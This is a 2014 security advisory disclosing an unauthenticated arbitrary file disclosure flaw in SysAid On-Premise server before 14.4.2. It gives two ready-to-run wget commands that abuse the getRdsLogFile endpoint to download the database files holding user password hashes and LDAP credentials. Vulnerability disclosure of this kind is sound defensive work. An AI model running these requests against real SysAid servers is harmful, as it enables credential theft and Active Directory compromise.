Vantage Point Security Advisory 2014-004
========================================

Title: SysAid Server Arbitrary File Disclosure
ID: VP-2014-004
Vendor: SysAid
Affected Product: SysAid On-Premise
Affected Versions: < 14.4.2
Product Website: http://www.sysaid.com/product/sysaid
Author: Bernhard Mueller <bernhard[at]vantagepoint[dot]sg>


Summary:
---
SysAid Server is vulnerable to an unauthenticated file disclosure
attack that allows an anonymous attacker to read arbitrary files on
the system. An attacker exploiting this issue can compromise SysAid
user accounts and gain access to important system files. When SysAid
is configured to use LDAP authentication it is possible to gain read
access to the entire Active Directory or obtain domain admin
privileges.

How to download SysAid server database files containing usernames and
password hashes (use any unauthenticated session ID):

wget -O "ilient.mdf" --header="Cookie:
JSESSIONID=1C712103AA8E9A3D3F1D834E0063A089" \
"http://sysaid.example.com/getRdsLogFile?fileName=c:\\\\Program+Files\\\\SysAidMsSQL\\\\MSSQL10_50.SYSAIDMSSQL\\\\MSSQL\\DATA\\\\ilient.mdf"

wget -O "ilient.ldf" --header="Cookie:
JSESSIONID=1C712103AA8E9A3D3F1D834E0063A089" \
"http://sysaid.example.com/getRdsLogFile?fileName=c:\\\\Program+Files\\\\SysAidMsSQL\\\\MSSQL10_50.SYSAIDMSSQL\\\\MSSQL\\DATA\\\\ilient_log.LDF"


The dowloaded MSSQL files contain the LDAP user account and encrypted
password used to access the Active Directory (SysAid encrypts the
password with a static key that is the same for all instances of the
software).
